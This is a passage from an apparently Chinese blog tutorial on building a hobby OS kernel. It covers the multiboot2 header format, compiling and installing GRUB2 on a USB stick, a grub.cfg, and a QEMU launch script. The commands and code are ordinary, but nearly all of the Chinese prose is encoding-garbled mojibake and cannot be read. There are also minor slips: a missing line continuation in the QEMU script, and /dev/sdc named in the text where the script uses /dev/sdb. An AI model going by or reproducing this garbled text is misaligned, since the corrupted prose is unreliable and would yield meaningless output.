è”ç›Ÿéƒ½å®£å¸ƒè¿™ç©æ„å·²ç»å½»åº•æˆä¸ºå†å²äº†ï¼ŒğŸ‘´ğŸšªå°±æ²¡æœ‰å¿…è¦å†æ·±ç©¶äº†ï¼Œå¤§æ¦‚äº†è§£ä¸€ä¸‹å·®ä¸å¤šå¾—äº†</del></p></blockquote><p>è€Œ UEFI è§„èŒƒè™½ç„¶ç»™äº†æˆ‘ä»¬æ›´ä¸ºæ–¹ä¾¿åœ°é€šè¿‡ UEFI çš„å„ç§æ¥å£å®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œä½†<strong>UEFI çš„å¤§éƒ¨åˆ†åŠŸèƒ½åœ¨ Runtime é˜¶æ®µæ˜¯ä¸å¯ç”¨çš„</strong>ï¼ŒåŒæ—¶è¿™ä¹Ÿå°‘ä¸äº†ç¼–å†™è®¾å¤‡è¯†åˆ«ã€æ–‡ä»¶ç³»ç»Ÿè§£æç­‰å·¥ä½œï¼Œå†é…ä¸Šç¼–å†™å„ç§åŸºç¡€è®¾æ–½ï¼Œä¸€å¥—å†™ä¸‹æ¥ä¸€ä¸ªEFI ç¨‹åºå…¶å®å·®ä¸å¤šå°±å·²ç»æ˜¯ä¸€ä¸ªå®Œæ•´çš„å°å†…æ ¸äº†â€”â€”å½“ç„¶ï¼Œ <em>ç›´æ¥ç”¨ EFI ç¨‹åºä½œä¸ºæ“ä½œç³»ç»Ÿå†…æ ¸ä¸æ˜¯ä¸è¡Œï¼Œçœ‹ç€ä¹Ÿç¡®å®åƒä¸ªæ ·å­</em> ï¼Œ<strong>å°±æ˜¯ä¸å¤ªä¼˜é›…ï¼Œä¹Ÿä¸å¤ªç°ä»£</strong></p><p>å› æ­¤ï¼Œå¯¹äºå†…æ ¸å¼•å¯¼é˜¶æ®µï¼Œæˆ‘ä»¬æš‚æ—¶é€‰æ‹©<strong>ç›´æ¥å¤ç”¨ç°æœ‰çš„æˆç†Ÿçš„æ–¹æ¡ˆ</strong>â€”â€”ä¾‹å¦‚ã€ŒGNU GRUBã€ï¼Œå…¶åŒæ—¶æ”¯æŒ Legacy BIOS ä¸ UEFI å¼•å¯¼ï¼Œè®©æˆ‘ä»¬ä¸ç”¨åœ¨ä¸€å¼€å§‹å°±é™·å…¥åˆ°ä¸å„ç§å­˜å‚¨è®¾å¤‡æ–—äº‰çš„æ³¥æ½­å½“ä¸­</p><p><img src="https://s2.loli.net/2022/09/07/eTCVOtlpE7PYFXq.png" alt="image.png"></p><blockquote><p>å½“ç„¶ï¼Œå¦‚æœè¯´ä»…ä»ã€Œå­¦ä¹ ã€çš„è§’åº¦è€Œè¨€è‡ªå·±äº²æ‰‹å†™ä¸€ä¸ª <code>MBR + boot loader</code> &#x2F; <code>EFI</code> å¹¶äº²èº«ä½“ä¼šåˆ°å…¶è½½å…¥å†…æ ¸çš„æ•´ä¸ªè¿‡ç¨‹å…¶å®æ˜¯ä¸€ä»¶éå¸¸æœ‰ç›Šå¤„çš„äº‹æƒ…ï¼ˆç¬‘ï¼‰</p><blockquote><p>å…ˆæŒ–ä¸ªå‘ï¼šæˆ‘ä»¬å°†åœ¨æ“ä½œç³»ç»Ÿå†…æ ¸å¼€å‘å®Œæˆä¹‹åçš„åç»­è¡¥å……æ–‡ç« ä¸­<strong>è‡ªè¡Œå¼€å‘ä¸€ä¸ª EFI ç¨‹åºä»¥å¼•å¯¼ç¬¦åˆ multiboot2 è§„èŒƒçš„å†…æ ¸</strong></p></blockquote></blockquote><blockquote><p>ä¹Ÿæœ‰äººä¼šé—®ï¼šé‚£ä¸ºä»€ä¹ˆä¸ç”¨ <a href="https://github.com/limine-bootloader/limine">Limine</a> æˆ–æ˜¯ <a href="https://gitlab.com/bztsrc/bootboot">BOOTBOOT</a> è¿™æ ·æ›´åŠ ç°ä»£çš„ boot loader å‘¢ï¼Ÿä¸€ä¸ªåŸå› å°±æ˜¯å› ä¸º GRUB ç›¸å¯¹æœ‰ç€æ›´å¥½çš„å…¼å®¹æ€§ï¼Œèƒ½å¤Ÿåœ¨æ›´å¤šè®¾å¤‡ä¸Šè¿è¡Œï¼Œæ•™ç¨‹èµ„æ–™ä¹Ÿæ¯”è¾ƒå¤š</p></blockquote><h2 id="Multiboot2-è§„èŒƒ"><a href="#Multiboot2-è§„èŒƒ" class="headerlink" title="Multiboot2 è§„èŒƒ"></a>Multiboot2 è§„èŒƒ</h2><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è®© GNU GRUB çŸ¥é“ä»–è¯¥æ€ä¹ˆå¼•å¯¼ä¸€ä¸ªä»€ä¹ˆæ ·çš„å†…æ ¸å‘¢ï¼Ÿç­”æ¡ˆæ˜¯é€šè¿‡<a href="https://www.gnu.org/software/grub/manual/multiboot/multiboot.html">å¤šé‡å¼•å¯¼è§„èŒƒ</a>ï¼ˆMultiboot Specificationï¼‰ï¼Œè¯¥è§„èŒƒåˆ¶å®šçš„ç›®çš„æ˜¯ä½¿å¾—éµå¾ªè¯¥è§„èŒƒçš„æ“ä½œç³»ç»Ÿå¯ä»¥è¢«åŒæ ·éµå¾ªè¯¥è§„èŒƒçš„ boot loader å¼•å¯¼ï¼Œè€Œæ— éœ€ç¼–å†™ç‰¹å®šäº OS çš„ boot loader</p><p>GNU GRUB ç¬¬äºŒç‰ˆè¿›è¡Œäº†å®Œå…¨çš„é‡å†™ï¼Œå¤šé‡å¼•å¯¼è§„èŒƒä¹Ÿæœ‰ä¸ª<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">ç¬¬äºŒç‰ˆ</a>ï¼Œä¸è¿‡å¥½åœ¨ GRUB2 åŒæ—¶æ”¯æŒä¸¤ç‰ˆå¼•å¯¼è§„èŒƒâ€”â€”è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<strong>ç¬¬äºŒç‰ˆ</strong>çš„è§„èŒƒ</p><blockquote><p>ç„¶è€Œ Linux kernel ä½¿ç”¨çš„<strong>å¹¶ä¸æ˜¯ multiboot  è§„èŒƒ</strong>ï¼Œè€Œæ˜¯å…¶<a href="https://www.kernel.org/doc/Documentation/x86/boot.txt">è‡ªå®šä¹‰çš„åè®®</a></p></blockquote><p>å¤šé‡å¼•å¯¼è§„èŒƒè¦æ±‚æˆ‘ä»¬çš„å†…æ ¸æ˜ åƒçš„å‰ <code>32768</code> å­—èŠ‚ä¸­ä¸€ä¸ªä»»æ„çš„ <strong>64ä½å¯¹é½çš„ä½ç½®</strong> å¿…é¡»è¦æœ‰ä¸€ä¸ª <a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Header-layout"><code>multiboot2 header</code></a> æ¥è®°å½•ç›¸åº”çš„ä¿¡æ¯ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p><table><thead><tr><th>Offset</th><th>Type</th><th>Field Name</th><th>Note</th></tr></thead><tbody><tr><td>0</td><td>u32</td><td>magic</td><td>required</td></tr><tr><td>4</td><td>u32</td><td>architecture</td><td>required</td></tr><tr><td>8</td><td>u32</td><td>header_length</td><td>required</td></tr><tr><td>12</td><td>u32</td><td>checksum</td><td>required</td></tr><tr><td>16-XX</td><td></td><td>tags</td><td>required</td></tr></tbody></table><ul><li><p><code>magic</code>ï¼šmultiboot2 header çš„æ ‡è¯†ï¼Œå¿…é¡»ä¸º <code>0xE85250D6</code></p></li><li><p><code>architecture</code>ï¼šæ ‡è¯†æŒ‡ä»¤é›†æ¶æ„ï¼Œ0 è¡¨ç¤º 32 ä½ i386 ä¿æŠ¤æ¨¡å¼ï¼Œ4 è¡¨ç¤º 32 ä½ MIPS</p></li><li><p><code>header_length</code> ï¼šåŒ…å« tags åœ¨å†…çš„æ•´ä¸ª multiboot2 header çš„å¤§å°</p></li><li><p><code>checksum</code>ï¼šè¯¥åŸŸä¸å‰ä¸‰ä¸ªåŸŸç›¸åŠ çš„å’Œä¸ºæ— ç¬¦å· 0</p></li><li><p><code>tags</code>ï¼šè¡¥å……åŸŸï¼Œå…¶æ ¼å¼é€šå¸¸å¦‚ä¸‹ï¼Œä»¥ç±»ä¼¼æ•°ç»„çš„å½¢å¼è·Ÿåœ¨åè¾¹ï¼Œ<strong>æ¯ä¸ª tag çš„èµ·å§‹åœ°å€8 å­—èŠ‚å¯¹é½</strong>ï¼Œ<strong>æ•´ä¸ª tag æ•°ç»„ä»¥ä¸€ä¸ª type ä¸º 0 åŠ size ä¸º 8 çš„ tag ç»“å°¾</strong>ï¼Œå…³äºä¸åŒç±»å‹çš„ tag æ ¼å¼ï¼Œå‚è§<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Header-tags">æ­¤å¤„</a>ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u16     |<span class="hljs-string"> type              </span>|<br>u16     |<span class="hljs-string"> flags             </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure></li></ul><h2 id="åœ¨-U-ç›˜ä¸Šå®‰è£…-GRUB2"><a href="#åœ¨-U-ç›˜ä¸Šå®‰è£…-GRUB2" class="headerlink" title="åœ¨ U ç›˜ä¸Šå®‰è£… GRUB2"></a>åœ¨ U ç›˜ä¸Šå®‰è£… GRUB2</h2><p>è™½ç„¶å¾ˆå¤šæ“ä½œç³»ç»Ÿç¼–å†™æ•™ç¨‹éƒ½æ˜¯åœ¨è™šæ‹Ÿæœºå½“ä¸­è¿è¡Œçš„ï¼Œæ¯•ç«Ÿ <em>å¯¹äºæ“ä½œç³»ç»Ÿåˆå­¦è€…è€Œè¨€æ›´é‡è¦çš„æ˜¯äº†è§£æ•´ä¸ªæ“ä½œç³»ç»Ÿçš„è¿è¡Œæœºç†</em> ï¼Œä½†æ˜¯<strong>åœ¨ç‰©ç†æœºä¸Šè¿è¡Œè‡ªå·±å†™çš„æ“ä½œç³»ç»Ÿæ˜¯éå¸¸ä»¤äººæ„Ÿåˆ°æ„‰æ‚¦çš„ä¸€ä»¶äº‹æƒ…</strong>ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°†ä¼šä»‹ç»å¦‚ä½•åœ¨ U ç›˜ä¸Šå®‰è£… GRUB æ¥å¼•å¯¼è‡ªå·±çš„æ“ä½œç³»ç»Ÿå†…æ ¸</p><blockquote><p>å¦‚æœä½ ä¸æƒ³å¼„è¿™ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå¯ä»¥è·³è½¬åˆ°ä¸‹ä¸€èŠ‚ï¼Œç›´æ¥å¼€å§‹å®‰å…¨åœ°ä½¿ç”¨ QEMUï¼Œæˆ‘ä»¬åé¢çš„å„ç§å¼€å‘è°ƒè¯•å…¶å®ä¸»è¦ä¹Ÿæ˜¯åœ¨ QEMU ä¸Šå®Œæˆçš„ ï¼šï¼‰</p></blockquote><ul><li><p>å¦‚æœä½ åœ¨ç‰©ç†æœºä¸Šä½¿ç”¨ Linux ä½œä¸šç³»ç»Ÿï¼Œè¯·æ‰¾åˆ°ä½ çš„ U ç›˜å¯¹åº”çš„è®¾å¤‡èŠ‚ç‚¹ï¼Œå¦‚æœä½ çš„è®¡ç®—æœºä»…æœ‰ä¸€å—å›ºæ€ç¡¬ç›˜ï¼Œåˆ™æ–°æ’å…¥çš„ U ç›˜ <em>é€šå¸¸</em> æ˜¯ <code>/dev/sda</code></p></li><li><p>å¦‚æœä½ åœ¨ç‰©ç†æœºä¸Šä½¿ç”¨ Windows æ“ä½œç³»ç»Ÿï¼Œå‡ºäºæ˜“ç”¨æ€§è€ƒè™‘ï¼Œè¯·åœ¨ Vmware è™šæ‹Ÿæœºä¸­å®‰è£…ä¸€ä¸ª Ubuntu æ“ä½œç³»ç»Ÿï¼Œå¹¶é€šè¿‡å¦‚ä¸‹æ–¹å¼å°† U ç›˜è¿æ¥åˆ°è™šæ‹Ÿæœºä¸­ï¼ˆè¯·å…ˆç¡®å®šå¥½ä½ çš„ U ç›˜å¯¹åº”çš„è®¾å¤‡åç§°ï¼‰ï¼Œåœ¨ä½ çš„è™šæ‹Ÿæœºå¤„åœ¨é»˜è®¤é…ç½®ä¸”ä¸å­˜åœ¨å¤–éƒ¨å­˜å‚¨è®¾å¤‡çš„æƒ…å†µä¸‹ï¼ŒU ç›˜å¯¹åº”çš„è®¾å¤‡èŠ‚ç‚¹é€šå¸¸æ˜¯ <code>/dev/sdb</code>ï¼š</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214055.png"></p><blockquote><p> ä¹Ÿå¯ä»¥é€šè¿‡é‡æ–°æ‹”æ’å¯ç§»åŠ¨è®¾å¤‡ä»¥è®© Vmware è‡ªè¡Œæˆªè·ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214205.png"></p><p>å¦‚æœä½ æ˜¯å…¶ä»–æƒ…å†µï¼Œè¯·è‡ªè¡Œè¿›è¡Œåˆ¤æ–­ ï¼š)</p></blockquote><p>é¦–å…ˆå®‰è£…ä¸€äº›ä¾èµ–ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install -y dosfstools mtools gparted gcc cmake git bison libopts25 libselinux1-dev m4 help2man libopts25-dev flex libfont-freetype-perl automake make autotools-dev autopoint libfreetype6-dev texinfo python3 autogen autoconf libtool libfuse3-3 unifont gettext binutils pkg-config liblzma5 libdevmapper-dev</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯¹ U ç›˜è¿›è¡Œåˆ†åŒºï¼Œ<strong>è¯·ç¡®ä¿ä½ å·²ç»å°†æ‰€æœ‰é‡è¦æ•°æ®å®Œæˆå¤‡ä»½</strong>ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©ä½¿ç”¨ <code>GParted</code> è¿›è¡Œåˆ†åŒºï¼Œæˆ‘ä»¬é¦–å…ˆé€šè¿‡ <code>Deviceâ†’Create Partion Table...</code> å»ºç«‹ä¸€ä¸ª GPT åˆ†åŒºè¡¨ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214927.png"></p><blockquote><p>æ­¤æ—¶å¯èƒ½ä¼šæç¤ºæ— æ³•é‡å»ºåˆ†åŒºè¡¨ï¼Œè¿™æ˜¯å› ä¸º Ubuntu å¯èƒ½å·å·å¸®ä½ æŠŠåˆ†åŒºæŒ‚è½½åœ¨ <code>/run/ä½ çš„ç”¨æˆ·å</code> ï¼Œè¯·ä½¿ç”¨ <code>umount</code> å¸è½½æ‰€æœ‰æ´»åŠ¨åˆ†åŒºï¼Œä¹‹åé‡æ–°å¯åŠ¨ <code>GParted</code></p></blockquote><p>ç„¶åå³é”®æ–°å»ºåˆ†åŒºï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©å»ºç«‹ä¸€ä¸ªå¤§å°ä¸º 512MB çš„ EFI åˆ†åŒºï¼Œæ³¨æ„<strong>è¯¥åˆ†åŒºå¿…é¡»ä¸º fat32 æ ¼å¼</strong>ï¼Œå‰©ä½™çš„ç©ºé—´ä½œä¸ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿåˆ†åŒºï¼Œ <em>æˆ‘ä»¬å°†åœ¨åç»­å¼€å‘æ–‡ä»¶ç³»ç»Ÿæ—¶ç”¨åˆ°å¥¹</em> ï¼Œåˆ’åˆ†å¥½åç‚¹ç»¿è‰²çš„âœ…ç„¶å <code>Apply</code>ï¼š</p><blockquote><p>è¿™é‡Œ GParted ä¼šåœ¨ U ç›˜æœ«å°¾ç•™ä¸‹ 1MB çš„ç©ºé—´ï¼Œç”¨æ¥æ”¾ MBR åˆ†åŒºè¡¨ï¼Œä¸»è¦æ˜¯å‡ºäºå…¼å®¹ç›®çš„</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231127160626.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä»æºç ç¼–è¯‘ GRUBï¼Œé¦–å…ˆä» <a href="https://ftp.gnu.org/gnu/grub/">GNU GRUB çš„ FTP æœåŠ¡å™¨</a>è¿›è¡Œä¸‹è½½æºç ï¼Œç„¶ååœ¨å•ç‹¬çš„æ–‡ä»¶å¤¹ä¸­è¿›è¡Œç¼–è¯‘ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸‰ç§ GRUB éƒ½ç¼–è¯‘ä¸Šï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://ftp.gnu.org/gnu/grub/grub-2.06.tar.xz</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ä¹Ÿå¯ä»¥ä»è¿™é‡Œè·å–ï¼š git <span class="hljs-built_in">clone</span> git://git.savannah.gnu.org/grub.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -xf grub-2.06.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> grub-2.06/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> EFI32 EFI64 BIOS</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> EFI64</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=x86_64 --with-platform=efi &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../EFI32</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=i386 --with-platform=efi &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../BIOS</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=i386 --with-platform=pc --disable-nls &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>æ³¨ï¼šå¦‚æœä½ ä½¿ç”¨çš„æ˜¯ Arch&#x2F;Fedora&#x2F;OpenSUSE è¿™æ ·æ›´æ–°æ¯”è¾ƒå¿«çš„ç³»ç»Ÿï¼Œåœ¨ç¼–è¯‘çš„æ—¶å€™å¯èƒ½ä¼šå‡ºé”™ï¼ˆ<del>GCC èƒŒå¤§é”…</del>ï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™å¯èƒ½å°±éœ€è¦ä½¿ç”¨æ›´æ–°ç‰ˆæœ¬çš„æºç ï¼Œç¬”è€…ç‰©ç†æœºæ­¤å‰ä½¿ç”¨çš„æ˜¯ Fedora Workstation 38ï¼Œç¼–è¯‘ 2.06 æ—¶çˆ†äº†è«åå…¶å¦™çš„é—®é¢˜ï¼Œæ‰€ä»¥åæ¥ç¬”è€…é€‰æ‹©äº† <a href="https://git.savannah.gnu.org/cgit/grub.git/tag/?h=grub-2.12-rc1">2.12 rc1</a> ç‰ˆæœ¬çš„ GRUB2</p></blockquote><p>ç„¶åå°† GRUB2 å®‰è£…åˆ° U ç›˜çš„ EFI åˆ†åŒºä¸Šï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt <span class="hljs-comment"># æ³¨æ„æ›¿æ¢æˆè‡ªå·±çš„ U ç›˜å¯¹åº”çš„è®¾å¤‡èŠ‚ç‚¹</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../EFI64/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --removable --no-floppy --target=x86_64-efi --boot-directory=/mnt/boot --efi-directory=/mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../../EFI32/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --removable --no-floppy --target=i386-efi --boot-directory=/mnt/boot --efi-directory=/mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../../BIOS/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --no-floppy --target=i386-pc --boot-directory=/mnt/boot /dev/sdb</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œç›´æ¥ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ <code>grub-install</code> ä¹Ÿå¯ä»¥ç›´æ¥å®‰è£…ï¼Œä½†æ˜¯ç¬”è€…åœ¨ Fedora ç³»ç»Ÿä¸Šä½¿ç”¨è‡ªå¸¦çš„ <code>grub2-install</code> æ—¶å‡ºç°äº†è¿™æ ·ä¸€ä¸ªé”™è¯¯ï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">grub2-install: <span class="hljs-keyword">error</span>: this utility cannot be used <span class="hljs-keyword">for</span> EFI platforms because <span class="hljs-keyword">it</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> support UEFI Secure Boot.<br></code></pre></td></tr></table></figure><p>ç½‘ä¸Šä¹Ÿæ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆæ¯”è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œç¬”è€…åªå¥½ä»æºç è¿›è¡Œç¼–è¯‘</p><blockquote><p>ä½†æ˜¯ Ubuntu è‡ªå¸¦çš„ <code>grub-install</code> å°±èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œ<del>tæ–°ç³»ç»Ÿçš„è‹¦é€¼.txt</del></p></blockquote></blockquote><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ–°å»ºä¸€ä¸ªæ–‡ä»¶ <code>/mnt/boot/grub/grub.cfg</code> ï¼ˆå‡è®¾ä½ çš„ U ç›˜ EFI åˆ†åŒºå’Œç¬”è€…ä¸€æ ·æŒ‚è½½åœ¨ <code>/mnt</code> ä¸‹ï¼‰ï¼Œå…¶ä¸º GRUB çš„é…ç½®æ–‡ä»¶ï¼Œç¼–å†™å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cfg">set timeout=10  # waiting time befo automatic booting<br>set default=0   # default menu entry index<br><br>insmod all_video<br><br>menuentry &quot;Boot ClosureOS v0.0.1&quot; &#123;<br>multiboot2 /boot/kernel.bin # use multiboot2 spec to boot<br>boot<br>&#125;<br><br>if [ $&#123;grub_platform&#125; == &quot;efi&quot; ]; then<br>menuentry &quot;UEFI Setting&quot; &#123;<br>fwsetup<br>&#125;<br>fi<br><br>menuentry &quot;System Reboot&quot; --class=reboot &#123;<br>reboot<br>&#125;<br><br>menuentry &quot;System Shutdown&quot; --class=halt &#123;<br>halt<br>&#125;<br></code></pre></td></tr></table></figure><p>å¸è½½ U ç›˜ï¼Œé‡æ–°å¯åŠ¨è®¡ç®—æœºï¼Œè¿›å…¥ä½ çš„ BIOS&#x2F;UEFI é…ç½®ç•Œé¢ï¼Œå…³é—­å®‰å…¨å¯åŠ¨ï¼ˆ<code>Secure Boot</code>ï¼‰ï¼Œå°† U ç›˜é…ç½®ä¸ºç¬¬ä¸€ä¸ªå¯åŠ¨é¡¹ï¼ˆé€šå¸¸å¼€å¤´ä¼šæœ‰ä¸€ä¸ª <code>UEFI: </code> çš„æ ‡è¯†ï¼‰ï¼Œé‡æ–°å¯åŠ¨è®¡ç®—æœºï¼Œæ¥ä¸‹æ¥â€”â€”</p><p><strong>GNU GRUBï¼Œå¯åŠ¨ï¼ï¼ï¼</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129040634.png"></p><p>å½“ç„¶ï¼Œç°åœ¨æˆ‘ä»¬è¿˜æ²¡æœ‰å¼€å§‹ç¼–å†™æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œæ‰€ä»¥æƒ³è¦ç›´æ¥å¯åŠ¨ä¼šæŠ¥é”™ï¼Œä¸è¿‡åé¢æˆ‘ä»¬ç¼–å†™çš„å†…æ ¸ç›´æ¥æ”¾åˆ° U ç›˜ EFI åˆ†åŒºçš„<code>boot/kernel.bin</code> è¿™ä¸ªä½ç½®å°±å¯ä»¥ç›´æ¥å¯åŠ¨äº†ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114235156.png"></p><h2 id="åˆ›å»ºåŒ…å«-GRUB2-çš„å¯åŠ¨é•œåƒæ–‡ä»¶å¹¶ä½¿ç”¨-QEMU-UEFI-å¯åŠ¨"><a href="#åˆ›å»ºåŒ…å«-GRUB2-çš„å¯åŠ¨é•œåƒæ–‡ä»¶å¹¶ä½¿ç”¨-QEMU-UEFI-å¯åŠ¨" class="headerlink" title="åˆ›å»ºåŒ…å« GRUB2 çš„å¯åŠ¨é•œåƒæ–‡ä»¶å¹¶ä½¿ç”¨ QEMU UEFI å¯åŠ¨"></a>åˆ›å»ºåŒ…å« GRUB2 çš„å¯åŠ¨é•œåƒæ–‡ä»¶å¹¶ä½¿ç”¨ QEMU UEFI å¯åŠ¨</h2><p>é¦–å…ˆå®‰è£…ä¸€äº›ä¾èµ–ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install -y qemu qemu-system-x86 ovmf xorriso</span><br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨å¦‚ä¸‹è„šæœ¬åœ¨ QEMU ä¸­ä» U ç›˜å¯åŠ¨ GRUBï¼Œæ³¨æ„æ›¿æ¢æˆä½ è‡ªå·±çš„ U ç›˜è®¾å¤‡èŠ‚ç‚¹è·¯å¾„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>sudo qemu-system-x86_64 \<br>-bios /usr/share/ovmf/OVMF.fd \<br>-cpu kvm64,+smep,+smap \<br>-smp sockets=1,dies=1,cores=4,threads=2 \<br>-m 4G \<br>--machine q35 \<br>-drive file=/dev/sdb,format=raw,index=0,media=disk<br>-s<br></code></pre></td></tr></table></figure><p>å„å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>-bios</code> ï¼šæŒ‡å®šä½¿ç”¨çš„å¯åŠ¨å›ºä»¶ï¼Œè¿™é‡Œæ˜¯ OVMFï¼Œæºè‡ªäº <a href="https://github.com/tianocore/edk2">EDK2</a> çš„ UEFI å›ºä»¶</li><li><code>-cpu</code>ï¼šæŒ‡å®š CPU ç±»å‹åŠç‰¹æ€§ï¼Œ<code>kvm64</code> æ˜¯ä¸€ç§å¸¸è§„çš„ CPU ç±»å‹ï¼Œ<code>+smep</code> å’Œ <code>+smap</code> è¡¨ç¤ºå¼€å¯é˜»æ­¢å†…æ ¸ç©ºé—´æ‰§è¡Œ&#x2F;è®¿é—®ç”¨æˆ·ç©ºé—´æ•°æ®çš„ä¿æŠ¤</li><li><code>-smp</code>ï¼šæŒ‡å®š CPU æ’æ§½æ•°ã€å•ä¸ªæ’æ§½ä¸Š DIE çš„æ•°é‡ã€æ¯ä¸ª DIE çš„æ ¸å¿ƒæ•°ã€æ¯ä¸ªæ ¸å¿ƒçš„çº¿ç¨‹æ•°</li><li><code>-m</code>ï¼šå†…å­˜å¤§å°</li><li><code>--machine</code> ï¼šæœºå™¨è®¾å¤‡ç±»å‹ï¼ŒQEMU æ”¯æŒä¸¤ç§è®¾å¤‡ï¼Œå¦å¤–ä¸€ç§æ˜¯æ¯”è¾ƒè€çš„ <code>i440fx</code></li><li><code>-drive</code>ï¼šæ·»åŠ ä¸€ä¸ªè®¾å¤‡ï¼Œè¿™é‡Œæ·»åŠ äº† <code>/dev/sdc</code> è®¾å¤‡</li><li><code>-s</code>ï¼šæ”¯æŒé€šè¿‡ä½¿ç”¨ gdb è¿æ¥ <code>0.0.0.0:1234</code> 